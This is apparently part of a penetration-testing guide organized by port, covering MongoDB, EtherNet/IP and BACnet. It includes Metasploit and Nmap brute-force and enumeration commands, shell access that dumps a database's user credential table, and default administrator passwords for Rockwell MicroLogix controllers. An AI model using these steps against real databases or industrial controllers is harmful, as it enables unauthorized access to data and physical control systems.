Sensepost has written a tool <a href="https://github.com/sensepost/go-derper" class="reference external">go-derper</a> and a article here <a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/" class="reference external">blackhat-write-up-go-derper-and-mining-memcaches</a> Blackhat slides <a href="https://media.blackhat.com/bh-ad-10/Sensepost/BlackHat-AD-2010-Slaviero-Lifting-the-Fog-slides.pdf" class="reference external">Lifting the Fog</a>


# Port 27017 - MongoDB

<a href="https://github.com/all3g/exploit-exercises/tree/master/mongodb" class="reference external">mongodb</a> provides a good walkthru how to check for vulns in mongodb;

## Metasploit

### MongoDB Login Utility

Module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication. This can be used to check if there is no-authentication on the MongoDB by setting blank\_passwords to true. This can also be checked using the Nmap nse mongodb-brute

    use auxiliary/scanner/mongodb/mongodb_login

Sample Output:
```
    [*] Scanning IP: 10.169.xx.xx
    [+] Mongo server 10.169.xx.xx dosn't use authentication
```
## Nmap

Nmap has three NSEs for mongo db databases

### Mongodb-info

    nmap 10.169.xx.xx -p 27017 -sV --script mongodb-info

    Starting Nmap 7.01 (https://nmap.org) at 2016-03-26 02:23 IST
    Nmap scan report for mongod.example.com (10.169.xx.xx)
    Host is up (0.088s latency).
    PORT      STATE SERVICE VERSION
    27017/tcp open  mongodb MongoDB 2.6.9 2.6.9
    | mongodb-info:
    |   MongoDB Build info
    |     OpenSSLVersion =
    |     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-function -Wno-deprecated-declarations -fno-builtin-memcmp
    |     loaderFlags = -fPIC -pthread -Wl,-z,now -rdynamic
    |     version = 2.6.9
    |     ok = 1
    |     maxBsonObjectSize = 16777216
    |     debug = false
    |     bits = 64
    |     javascriptEngine = V8
    |     sysInfo = Linux build20.mongod.example.com 2.6.32-431.3.1.el6.x86_64 #1 SMP Fri Jan 3 21:39:27 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
    |     versionArray
    |       1 = 6
    |       2 = 9
    |       3 = 0
    |       0 = 2
    |     allocator = tcmalloc
    |     gitVersion = df313bc75aa94d192330cb92756fc486ea604e64
    |   Server status
    |     opcounters
    |       query = 19752
    |       update = 1374
    |       insert = 71735056
    |       command = 78465013
    |       delete = 121
    |       getmore = 4156
    |       connections
    |         available = 795
    |       totalCreated = 4487
    |       current = 24
    |     uptimeMillis = 3487298933
    |     localTime = 1458938079849
    |     metrics
    |       getLastError
    |         wtime
    |           num = 0
    |           totalMillis = 0
    |     uptimeEstimate = 3455635
    |     version = 2.6.9
    |     uptime = 3487299
    |     network
    |       bytesOut = 17159001651
    |       numRequests = 78517212
    |       bytesIn = 73790966211
    |     host = nvt-prod-05
    |     mem
    |       supported = true
    |       virtual = 344
    |       resident = 31
    |       bits = 64
    |     pid = 25964
    |     extra_info
    |       heap_usage_bytes = 2798848
    |       page_faults = 16064
    |       note = fields vary by platform
    |     asserts
    |       warning = 1
    |       regular = 1
    |       rollovers = 0
    |       user = 11344
    |       msg = 0
    |     process = mongos
    |_    ok = 1

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds

### Mongodb-database

To find the databases in the mongodb.

    nmap 122.169.xx.xx -p 27017 -sV --script mongodb-databases.nse

    Starting Nmap 7.01 (https://nmap.org) at 2016-03-26 02:23 IST
    Nmap scan report for mongod.example.com (10.169.xx.xx)
    Host is up (0.090s latency).
    PORT      STATE SERVICE VERSION
    27017/tcp open  mongodb MongoDB 2.6.9
    | mongodb-databases:
    |   ok = 1
    |   databases
    |     1
    |       shards
    |       rs0 = 1
    |         sizeOnDisk = 1
    |       empty = true
    |       name = test
    |     0
    |       shards
    |         rs0 = 21415067648
    |         rs1 = 17122197504
    |       sizeOnDisk = 38537265152
    |       empty = false
    |       name = genprod
    |     3
    |       sizeOnDisk = 16777216
    |       empty = false
    |       name = admin
    |     2
    |       sizeOnDisk = 50331648
    |       empty = false
    |       name = config
    |   totalSize = 38537265153
    |_  totalSizeMb = 36752

### Mongodb-BruteForce
```
    nmap 10.169.xx.xx -p 27017 -sV --script mongodb-brute -n

    Starting Nmap 7.01 (https://nmap.org) at 2016-03-26 02:28 IST
    Nmap scan report for 122.169.xx.xx
    Host is up (0.086s latency).
    PORT      STATE SERVICE VERSION
    27017/tcp open  mongodb MongoDB 2.6.9
    |_mongodb-brute: No authentication needed
```
## Other

### Connection String

    mongodb://[username:password@]host[:port][/[database][?options]]

    mongodb://     A required prefix to identify that this is a string in the standard connection format.
    username:password@     Optional. If specified, the client will attempt to log in to the specific database using these credentials after connecting to the mongod instance.
    host   Required. It identifies a server address to connect to. It identifies either a hostname, IP address, or UNIX domain socket.

    /database      Optional. The name of the database to authenticate if the connection string includes authentication credentials in the form of username:password@. If /database is not specified and the connection string includes credentials, the driver will authenticate to the admin database.

### Mongo-shell

This database can be connected using

    mongo 10.169.xx.xx /databasename
    MongoDB shell version: 2.4.10
    connecting to: 122.169.xx.xx/test

Show DBS can be used to see the current databases;

    mongos> show dbs
    admin        0.015625GB
    config       0.046875GB
    genprod      35.890625GB
    test (empty)

Use command can be used select the database

    mongos> use admin
    switched to db admin

Show collections can be used to see the tables;
```
     mongos> show collections
     nxae
     system.indexes
     system.users
     system.version

    db.foo.find()                list objects in collection foo

    ::

     db.system.users.find()
     { "_id" : "test.root", "user" : "root", "db" : "test", "credentials" : { "MONGODB-CR" : "d6zzzdb4538zzz339acd585fa9zzzzzz" }, "roles" : [  {  "role" : "dbOwner",  "db" : "test" } ] }
     { "_id" : "genprod.root", "user" : "root", "db" : "genprod", "credentials" : { "MONGODB-CR" : "d6zzzdb4538zzz339acd585fa9zzzzzz" }, "roles" : [  {  "role" : "dbOwner",  "db" : "genprod" } ] }
```
It is important that to have a look at the <a href="https://docs.mongodb.com/manual/reference/method/" class="reference external">Mongo Shell Methods</a> There are methods such as collection, cursor etc. In Collection, there are

-   db.collection.deleteOne() Deletes a single document in a collection.
-   db.collection.find() Performs a query on a collection or a view and returns a cursor object.
-   db.collection.insert() Creates a new document in a collection.

In cursor method, there are

-   cursor.forEach() Applies a JavaScript function for every document in a cursor. The following example invokes the forEach() method on the cursor returned by find() to print the name of each user in the collection:

    db.users.find().forEach( function(myDoc) { print( "user: " + myDoc.name ); } );

-   cursor.toArray() Returns an array that contains all documents returned by the cursor.


# Port 44818 - EthernetIP

If we found TCP Port 44818, probably it’s running Ethernet/IP. Rockwell Automation/ Allen Bradley developed the protocol and is the primary maker of these devices, e.g. ControlLogix and MicroLogix, but it is an open standard and a number of vendors offer an EtherNet/IP interface card or solution.

<a href="https://github.com/digitalbond/Redpoint" class="reference external">Redpoint</a> has released a NSE for enumeration of these devices

## Nmap

### enip-enumerate

    nmap -p 44818 -n --script enip-enumerate x.x.x.x -Pn

    Starting Nmap 7.01 (https://nmap.org) at 2016-03-25 18:49 IST
    Nmap scan report for x.x.x.x
    Host is up (0.83s latency).
    PORT      STATE SERVICE
    44818/tcp open  EtherNet/IP
    | enip-enumerate:
    |   Vendor: Rockwell Automation/Allen-Bradley (1)
    |   Product Name: 1766-L32BXB B/10.00
    |   Serial Number: 0x40605446
    |   Device Type: Programmable Logic Controller (14)
    |   Product Code: 90
    |   Revision: 2.10
    |_  Device IP: 192.168.xx.xx

Rockwell Automation has

-   MicroLogix 1100: Default Username:password is administrator:ml1100
-   MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is <a href="http://literature.rockwellautomation.com/idc/groups/literature/documents/um/1766-um002_-en-p.pdf" class="reference external">MicroLogix 1400</a> guest:guest is another default password.

# Port 47808 - UDP BACNet

If we found UDP Port 47808 open, we can use BACnet-discover-enumerate NSE created by <a href="https://github.com/digitalbond/Redpoint" class="reference external">Redpoint</a> Should read <a href="http://www.digitalbond.com/blog/2014/03/26/redpoint-discover-enumerate-bacnet-devices/" class="reference external">Discover Enumerate bacnet devices</a>

## BACNet-discover-enumerate

    nmap -sU -p 47808 -n -vvv --script BACnet-discover-enumerate --script-args full=yes 182.X.X.X
    Nmap scan report for 182.X.X.X
    Host is up (0.11s latency).
    PORT      STATE SERVICE
    47808/udp open  BACNet -- Building Automation and Control Networks
    | BACnet-discover-enumerate:
    |   Vendor ID: Automated Logic Corporation (24)
    |   Vendor Name: Automated Logic Corporation
    |   Object-identifier: 2404999
    |   Firmware: BOOT(id=0,ver=0.01:001,crc=0x0000) MAIN(id=3,ver=6.00a:008,crc=0x2050)
    |   Application Software: PRG:carrier_19xrv_chiller_01_er_mv
    |   Object Name: device2404999
    |   Model Name: LGR1000
    |   Description: Device Description
    |   Location: Device Location
    |   Broadcast Distribution Table (BDT):
    |     182.X.X.X:47808
    |_  Foreign Device Table (FDT): Empty Table


# Appendix

## References
